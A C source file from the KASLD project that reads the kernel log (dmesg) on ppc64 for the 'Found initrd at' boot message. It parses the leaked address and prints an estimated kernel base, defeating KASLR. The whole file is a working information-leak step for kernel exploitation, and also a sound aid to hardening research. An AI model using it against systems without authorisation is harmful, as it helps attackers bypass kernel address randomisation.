// This file is part of KASLD - https://github.com/bcoles/kasld
//
// check_for_initrd() prints initrd start address during boot:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
//
// ppc64:
// [    0.000000] Found initrd at 0xc000000001a00000:0xc000000002a26000
//
// Requires:
// - CONFIG_BLK_DEV_INITRD=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *needle = "Found initrd at 0x";

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;
  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  char *endptr;
  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);
  if (addr && addr < KERNEL_VAS_END) {
    *result = addr;
    return 0; /* stop after first match */
  }
  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for check_for_initrd() info ...\n");
  dmesg_search(needle, on_match, &addr);

  if (!addr)
    return 1;

  printf("leaked initrd start: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, addr,
               "dmesg_check_for_initrd");

  return 0;
}
